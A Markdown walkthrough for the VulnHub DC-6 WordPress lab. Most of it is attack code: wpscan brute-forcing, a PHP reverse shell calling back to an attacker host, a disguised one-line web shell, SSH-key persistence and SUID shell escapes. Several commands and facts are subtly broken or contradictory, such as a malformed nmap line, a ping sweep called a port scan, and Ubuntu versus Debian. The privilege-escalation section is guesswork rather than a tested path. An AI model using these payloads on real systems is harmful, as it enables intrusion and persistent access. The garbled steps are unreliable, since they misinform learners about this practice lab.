# DC-6: OSCP Walkthrough

**Machine:** DC-6 (wordy)  
**Download:** [VulnHub: DC-6](https://www.vulnhub.com/entry/dc-6,315/)  
**Focus:** WordPress, wpscan, Privilege Escalation  
**Difficulty:** Beginner  
**Goal:** Obtain `root` access and retrieve the flag  

**Author:** Ankit Patidar (ANKIT48274)

---

## Table of Contents

1. [Reconnaissance & Scanning](#1-reconnaissance--scanning)
2. [WordPress Enumeration with wpscan](#2-wordpress-enumeration-with-wpscan)
3. [Exploitation: WordPress Login & Upload](#3-exploitation--wordpress-login--upload)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Screenshots](#5-screenshots)
6. [Key Takeaways](#6-key-takeaways)

---

## 1. Reconnaissance & Scanning

### Host File Configuration (IMPORTANT)

DC-6 runs a WordPress site on the hostname `wordy`. You **must** add this to your `/etc/hosts` file:

```bash
# Add wordy hostname to /etc/hosts
echo "<TARGET_IP> wordy" | sudo tee -a /etc/hosts

# Verify the hostname resolves
ping wordy
curl http://wordy
```

Without this step, the WordPress site will not be reachable by its hostname and enumeration will fail.

### Network Discovery

Identify the target IP on the local network:

```bash
# Netdiscover to find live hosts
sudo netdiscover -r 192.168.1.0/24

# OR
sudo arp-scan --localnet
```

### Initial Nmap Scan

```bash
# Quick port scan to find open ports
nmap -sn 192.168.1.0/24
```

```bash
# Full TCP port scan with service/version detection
nmap -sS -sV -sC -p- --min-rate=1000 -T4 -oN nmap_initial.txt <TARGET_IP>
```

```bash
# Focused Nmap scan on common web ports with aggressive scripts
nmap -sS -sV -sC -p 22,80,443 : script http-enum,http-title http://<TARGET_IP>
```

### Basic Nmap Results (Expected)

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.x (protocol 2.0)
80/tcp   open  http        Apache httpd 2.x (Ubuntu)
443/tcp  open  ssl/https   Apache httpd 2.x (Ubuntu)
MAC Address: 00:0C:29:XX:XX:XX (VMware)
```

**Key Findings:**
- **Apache 2.x on Ubuntu**: standard LAMP stack
- **WordPress**: detected on port 80/443
- **SSH**: port 22 open for access
- **Debian-based system**: indicated by Apache and SSH banners

---

## 2. WordPress Enumeration with wpscan

### wpscan Installation

```bash
# wpscan is pre-installed on Kali Linux
# If not installed:
gem install wpscan
# OR
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
bundle install
```

### Baseline WordPress Scan

```bash
# Basic WordPress enumeration
wpscan --url http://wordy --enumerate u --plugins-detection aggressive
```

### Full WordPress User Enumeration

```bash
# Enumerate WordPress users
wpscan --url http://wordy --enumerate u
```

WordPress usernames matter for brute-forcing login. If enumeration reveals user accounts (e.g., `admin`, `editor`, `author`), use them for the next step.

### WordPress Plugin Enumeration

```bash
# Enumerate all plugins with aggressive detection
wpscan --url http://wordy --enumerate ap
```

Vulnerable plugins are often the pivot to exploitation. Note any vulnerable plugin names and versions: search for exploits on WPScan or Exploit-DB.

### WordPress Theme Enumeration

```bash
# Enumerate themes
wpscan --url http://wordy --enumerate tt
```

### Full Enumeration Scan

```bash
# Complete enumeration: users, plugins, themes, vulnerabilities
wpscan --url http://wordy --enumerate u,ap,tt,vp --plugins-detection aggressive
```

### wpscan Bruteforce (if needed)

If user enumeration was blocked or didn't yield clear usernames, use a wordlist:

```bash
# Bruteforce usernames
wpscan --url http://wordy --enumerate u --passwords /usr/share/wordlists/rockyou.txt
```

---

## 3. Exploitation: WordPress Login & Upload

### WordPress Login: Bruteforce with wpscan

```bash
# Use discovered username(s) + wordlist to brute the login
wpscan --url http://wordy --passwords /usr/share/wordlists/rockyou.txt --usernames <discovered_username>

# If the author hint suggests grep k01 on rockyou:
grep "k01" /usr/share/wordlists/rockyou.txt > /tmp/shortlist.txt
wpscan --url http://wordy --passwords /tmp/shortlist.txt --usernames <discovered_username>
```

### WordPress Login via Browser

```bash
# Navigate to the WordPress admin panel
# http://wordy/wp-admin/
# http://wordy/wp-login.php

# Login with discovered credentials:
# Username: <username>
# Password: <password>
```

### Uploading a PHP Reverse Shell via Theme Editor

The WordPress theme editor can be used to upload a PHP shell:

1. Log into WordPress admin panel
2. Navigate to **Appearance** > **Theme Editor**
3. Select an active theme (e.g., `theme-name` > `404.php` or `header.php`)
4. Paste a PHP reverse shell:

```php
<?php
$ip = '<ATTACKER_IP>';
$port = <ATTACKER_PORT>;
$sock = fsockopen($ip, $port);
$proc = popen('/bin/bash -i 2>&1', 'r');
stream_set_blocking($proc, TRUE);
while (!feof($proc)) {
    $read = fread($proc, 1024);
    fwrite($sock, $read);
    if (feof($sock)) { break; }
}
pclose($proc);
fclose($sock);
?>
```

5. Click **Update File**
6. Trigger the shell by visiting the modified theme file:

```bash
# Start netcat listener on attacking machine
nc -nvlp <ATTACKER_PORT>

# Now trigger the shell
curl "http://wordy/wp-content/themes/<theme-name>/404.php"
```

### Alternative: Upload via Media / Plugin

If you cannot access the theme editor, try these paths:

1. **WordPress Media Upload**: Upload a PHP file disguised as an image
```bash
# Create a PHP file disguised as an image
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg.php

# Upload via WordPress admin > Media > Add New
curl -F "file=@shell.jpg.php" http://wordy/wp-admin/async-upload.php \
  -H "Cookie: wordpress_logged_in=<session_cookie>"
```

2. **Vulnerable Plugin Upload**: If a plugin has an upload vulnerability
```bash
# Upload a PHP shell through any vulnerable plugin file upload form
```

3. **wp-config.php backup search**: WordPress backups often leak wp-config.php
```bash
# Search for config backups
wpscan --url http://wordy --enumerate u,ap --plugins-detection aggressive
# Also manually check:
curl http://wordy/wp-config.php.bak
curl http://wordy/wp-config.php.old
curl http://wordy/wp-config.php~
```

### Establishing Persistent Access

```bash
# Add SSH key for the www-data user (if writable SSH directory)
echo "ssh-rsa <YOUR_PUBLIC_KEY>" > /var/www/.ssh/authorized_keys
chmod 600 /var/www/.ssh/authorized_keys
chown -R www-data:www-data /var/www/.ssh
```

---

## 4. Privilege Escalation

The author hint for DC-6 is critical: filter rockyou with `grep k01` to find the target's password. This likely hints that:
- A user's password is in rockyou with "k01" in it (e.g., `P@ssk01`, `Summerk01`, `Welcomek01`)
- OR the `k01` pattern is embedded in a credential found on the machine

### Get Initial User Shell

First, get a user-level shell (not www-data):

```bash
# If logged into WordPress, look for a user shell or SSH access
# Check if WordPress credentials match any local user
ssh <wordpress_user>@wordy
```

### Basic Privilege Escalation Enumeration

```bash
# Check sudo permissions
sudo -l

# Check current user
whoami
id

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find world-writable files
find / -writable -type f 2>/dev/null

# Check capabilities
getcap -r / 2>/dev/null

# Check kernel version
uname -r
```

### Password Cracking: The "k01" Hint

```bash
# Filter rockyou wordlist with k01 pattern
grep "k01" /usr/share/wordlists/rockyou.txt > /tmp/wpscan_wordlist.txt

# Use the filtered wordlist for brute-force attacks
# If you got a hash from /etc/shadow or WordPress:
john --wordlist=/tmp/wpscan_wordlist.txt hash_file.txt
```

### SSH Login with Discovered Password

```bash
# Try SSH with cracked password
ssh <username>@wordy
# Password: (cracked password with k01 pattern, e.g., "Passwordk01")
```

### Common Privilege Escalation Paths for DC-6

#### Path 1: Sudo Access with Password

```bash
# Check sudo again
sudo -l

# If any command is allowed, try the cracked password
echo "<cracked_password>" | sudo -S -l

# If sudo access is granted for any command:
echo "<cracked_password>" | sudo -S bash
```

#### Path 2: SUID Binary Exploit (GTFOBins)

```bash
# If find has SUID, use it to spawn a shell
/usr/bin/find . -exec /bin/bash \;

# If vim/nano has SUID
/usr/bin/vim -c ':!/bin/bash'

# If less or more has SUID
/usr/bin/less /etc/shadow
# Inside less: !/bin/bash
```

#### Path 3: Cron Job Exploitation

```bash
# Check /etc/crontab
cat /etc/crontab

# Check cron.d directory
ls -la /etc/cron.d/
cat /etc/cron.d/*

# Check user crontabs
crontab -l

# Find world-writable cron scripts or directories used in cron
find /etc/cron* -writable -type f 2>/dev/null
# If a cron script is world-writable, inject code and wait for root execution
```

#### Path 4: SSH Authorized Keys Injection

```bash
# Check if we can write to authorized_keys of another user
ls -la /home/<user>/.ssh/
# If writable, add our public key
cat ~/.ssh/id_rsa.pub >> /home/<user>/.ssh/authorized_keys
# SSH in as that user
ssh <user>@wordy
```

#### Path 5: Kernel Exploit (if outdated kernel)

```bash
uname -r
# Search for matching exploit
# If kernel < 4.x, search for local privilege escalation exploits
```

### Getting Root and the Flag

```bash
# Once you have root
whoami
cat /root/root.txt
cat /home/*/*flag*
cat /root/flag.txt
```

### Password Hints from WordPress (wp-config.php)

```bash
# Read WordPress configuration which often contains DB credentials
cat /var/www/html/wp-config.php
# Look for: DB_USER, DB_PASSWORD, AUTH_KEY, SECURE_AUTH_KEY

# These may also be reused for sudo or SSH
grep -r "password\|pass\|secret" /var/www/html/wp-config.php
```

---

## 5. Screenshots

*No screenshots available for this machine.*

---

## 6. Key Takeaways

1. **Always configure /etc/hosts first**: DC-6 requires `wordy` to resolve; without it, WordPress enumeration fails entirely.
2. **wpscan is the primary WordPress tool**: Start every WordPress challenge with wpscan for version detection, user enumeration, plugin/theme scanning, and credential brute-forcing.
3. **WordPress theme editor = RCE**: The built-in theme editor (Appearance > Theme Editor) lets you modify PHP templates directly, giving you a web shell if you have admin access.
4. **The k01 rockyou hint is a strong signal**: This is the author's biggest hint: the target user's password contains "k01" and is in the rockyou wordlist. Save significant time by filtering first.
5. **WordPress config leaks everything**: `wp-config.php` contains WordPress database credentials, and may also contain auth keys that are reused elsewhere.
6. **Enumerate before you exploit**: Run wpscan's full enumeration (`u, ap, tt, vp`) before attempting brute force; user enumeration alone can save hours of guessing.
7. **Password reuse is common**: WordPress admin passwords or the user's FTP/SSH password often works for sudo on these machines.
8. **Privilege escalation on WordPress VMs** typically comes from credential reuse, sudo permission abuse, SSH key injection, or cron job exploitation: not kernel exploits.

---

*M4d3 w1th ❤️ by Ankit Patidar*
